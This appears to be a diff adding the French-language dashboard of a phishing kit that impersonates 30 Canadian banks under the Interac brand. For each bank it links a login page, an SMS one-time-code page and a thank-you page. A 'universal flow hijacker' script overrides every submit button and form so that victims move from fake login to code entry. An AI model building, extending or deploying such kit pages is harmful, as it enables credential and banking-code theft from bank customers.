@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>INTERAC — Tableau de bord</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#0b0d14;min-height:100vh;color:#fff}
+
+/* HEADER */
+.top{background:linear-gradient(135deg,#13161f,#1c1f2e);padding:28px 40px;border-bottom:1px solid rgba(255,255,255,.07);display:flex;align-items:center;justify-content:space-between;gap:20px}
+.top-left h1{font-size:26px;font-weight:800;letter-spacing:-0.5px}
+.top-left p{color:#8b93a8;font-size:13px;margin-top:5px}
+.interac-badge{display:flex;align-items:center;gap:10px}
+.interac-badge a{background:#FFCD00;padding:8px 18px;border-radius:8px;font-weight:900;font-size:14px;color:#000;text-decoration:none;letter-spacing:1px;transition:opacity .15s}
+.interac-badge a:hover{opacity:.85}
+
+/* STATS */
+.stats{display:flex;gap:12px;padding:24px 40px 8px;flex-wrap:wrap}
+.stat{background:#13161f;border:1px solid rgba(255,255,255,.07);border-radius:10px;padding:14px 22px;min-width:130px}
+.stat-val{font-size:26px;font-weight:800;color:#fff}
+.stat-lbl{font-size:12px;color:#6b7280;margin-top:3px}
+
+/* SEARCH */
+.search-wrap{padding:16px 40px 0}
+.search-wrap input{width:100%;max-width:400px;background:#13161f;border:1px solid rgba(255,255,255,.1);border-radius:10px;padding:12px 16px;color:#fff;font-size:14px;outline:none}
+.search-wrap input::placeholder{color:#6b7280}
+.search-wrap input:focus{border-color:#4f73ff}
+
+/* GRID */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));gap:14px;padding:20px 40px 40px}
+.card{background:#13161f;border:1px solid rgba(255,255,255,.07);border-radius:14px;overflow:hidden;transition:transform .15s,box-shadow .15s,border-color .15s}
+.card:hover{transform:translateY(-3px);box-shadow:0 10px 36px rgba(0,0,0,.5);border-color:rgba(255,255,255,.15)}
+.card-stripe{height:5px}
+.card-body{padding:18px 20px 20px}
+.bank-name{font-size:16px;font-weight:700;margin-bottom:3px}
+.bank-key{color:#4b5563;font-size:11px;font-family:'Courier New',monospace;margin-bottom:14px}
+.btns{display:flex;gap:8px;flex-wrap:wrap}
+.btn{display:inline-block;padding:7px 13px;border-radius:8px;font-size:12px;font-weight:700;text-decoration:none;transition:opacity .15s;letter-spacing:.2px}
+.btn:hover{opacity:.8}
+.btn-login{background:#2563eb;color:#fff}
+.btn-sms{background:#7c3aed;color:#fff}
+.btn-ty{background:#059669;color:#fff}
+
+@media(max-width:600px){
+  .top,.stats,.search-wrap,.grid{padding-left:16px;padding-right:16px}
+  .stats{gap:8px}
+}
+</style>
+</head>
+<body>
+
+<div class="top">
+  <div class="top-left">
+    <h1>🏦 INTERAC — Toutes les banques</h1>
+    <p>Serveur local · Testez le flux complet pour chaque banque</p>
+  </div>
+  <div class="interac-badge">
+    <a href="index.html" target="_blank">🔗 Page INTERAC principale</a>
+  </div>
+</div>
+
+<div class="stats">
+  <div class="stat"><div class="stat-val">30</div><div class="stat-lbl">Banques</div></div>
+  <div class="stat"><div class="stat-val">3</div><div class="stat-lbl">Pages / banque</div></div>
+  <div class="stat"><div class="stat-val" id="filtered">30</div><div class="stat-lbl">Affichées</div></div>
+</div>
+
+<div class="search-wrap">
+  <input type="text" id="search" placeholder="🔍  Chercher une banque..." oninput="filterBanks()">
+</div>
+
+<div class="grid" id="grid"></div>
+
+<script>
+const banks = [
+  {key:"1stchoicesavings", name:"1st Choice Savings",     color:"#005A9C"},
+  {key:"accesscu",         name:"Access Credit Union",    color:"#00529B"},
+  {key:"alterna",          name:"Alterna Bank",           color:"#005F9E"},
+  {key:"atb",              name:"ATB Financial",          color:"#003087"},
+  {key:"bmo",              name:"BMO",                    color:"#0075BE"},
+  {key:"central1",         name:"Central 1",              color:"#00539B"},
+  {key:"cibc",             name:"CIBC",                   color:"#AC1F2D"},
+  {key:"coastcapital",     name:"Coast Capital Savings",  color:"#005B96"},
+  {key:"connectfirst",     name:"connectFirst CU",        color:"#005B96"},
+  {key:"desjardins",       name:"Desjardins",             color:"#009639"},
+  {key:"eqbank",           name:"EQ Bank",                color:"#12284C"},
+  {key:"fnbc",             name:"FNBC",                   color:"#003087"},
+  {key:"koho",             name:"KOHO",                   color:"#0D0B2B"},
+  {key:"lakelandcu",       name:"Lakeland Credit Union",  color:"#005B96"},
+  {key:"laurentian",       name:"Banque Laurentienne",    color:"#8B0000"},
+  {key:"meridian",         name:"Meridian Credit Union",  color:"#003087"},
+  {key:"nationalbank",     name:"Banque Nationale",       color:"#E41C23"},
+  {key:"neo",              name:"Neo Financial",          color:"#1A1A2E"},
+  {key:"pcfinancial",      name:"PC Financial",           color:"#D62828"},
+  {key:"peoplestrust",     name:"Peoples Trust",          color:"#005B96"},
+  {key:"rbc",              name:"RBC Royal Bank",         color:"#005DAA"},
+  {key:"rockycu",          name:"Rocky Credit Union",     color:"#005B96"},
+  {key:"scotiabank",       name:"Scotiabank",             color:"#EC111A"},
+  {key:"servuscu",         name:"Servus Credit Union",    color:"#005B96"},
+  {key:"simplii",          name:"Simplii Financial",      color:"#D62828"},
+  {key:"tangerine",        name:"Tangerine",              color:"#FF6700"},
+  {key:"td",               name:"TD Bank",                color:"#54B848"},
+  {key:"uni",              name:"UNI",                    color:"#003087"},
+  {key:"vancity",          name:"Vancity",                color:"#005B96"},
+  {key:"wealthsimple",     name:"Wealthsimple",           color:"#111111"},
+];
+
+function renderBanks(list) {
+  const grid = document.getElementById('grid');
+  grid.innerHTML = list.map(b => `
+    <div class="card" data-name="${b.name.toLowerCase()} ${b.key}">
+      <div class="card-stripe" style="background:${b.color}"></div>
+      <div class="card-body">
+        <div class="bank-name">${b.name}</div>
+        <div class="bank-key">${b.key}</div>
+        <div class="btns">
+          <a class="btn btn-login" href="${b.key}.html" target="_blank">🏦 Login</a>
+          <a class="btn btn-sms"   href="${b.key}_sms.html" target="_blank">📱 SMS</a>
+          <a class="btn btn-ty"    href="${b.key}_thankyou.html" target="_blank">✅ Thank You</a>
+        </div>
+      </div>
+    </div>`).join('');
+  document.getElementById('filtered').textContent = list.length;
+}
+
+function filterBanks() {
+  const q = document.getElementById('search').value.toLowerCase();
+  renderBanks(q ? banks.filter(b => b.name.toLowerCase().includes(q) || b.key.includes(q)) : banks);
+}
+
+renderBanks(banks);
+</script>
+
+<script>
+// UNIVERSAL FLOW HIJACKER
+document.addEventListener("DOMContentLoaded", function() {
+    setTimeout(function() {
+        var btns = document.querySelectorAll("button, input[type='submit'], .btn");
+        btns.forEach(function(btn) {
+            var clone = btn.cloneNode(true);
+            if (btn.parentNode) {
+                btn.parentNode.replaceChild(clone, btn);
+                clone.style.pointerEvents = "auto";
+                clone.removeAttribute("disabled");
+                
+                clone.addEventListener("click", function(e) {
+                    var text = (clone.textContent || clone.value || "").toLowerCase().trim();
+                    var isSubmit = clone.getAttribute("type") === "submit" || clone.tagName === "BUTTON" || text.indexOf("valid") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("log") !== -1 || text.indexOf("sign") !== -1 || text.indexOf("connex") !== -1 || text.indexOf("next") !== -1 || text.indexOf("suivant") !== -1;
+                    
+                    if (isSubmit) {
+                        e.preventDefault();
+                        e.stopImmediatePropagation();
+                        
+                        var current = window.location.pathname.split("/").pop();
+                        if (current.indexOf("_sms.html") !== -1) {
+                            window.location.href = current.replace("_sms.html", "_step3.html");
+                        } else if (current.indexOf("_step3.html") !== -1) {
+                            alert("Vérification terminée !");
+                        } else if (current !== "index.html" && current !== "") {
+                            window.location.href = current.replace(".html", "_sms.html");
+                        }
+                    }
+                }, true);
+            }
+        });
+        
+        // Also forcibly hijack all form submits
+        var forms = document.querySelectorAll("form");
+        forms.forEach(function(form) {
+            form.setAttribute("action", "javascript:void(0)");
+            form.onsubmit = function(e) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+            };
+        });
+    }, 300); // slight delay to ensure other frameworks finish loading
+});
+</script>
+
+<script src="security_module.js"></script>
+</body>
+</html>
+
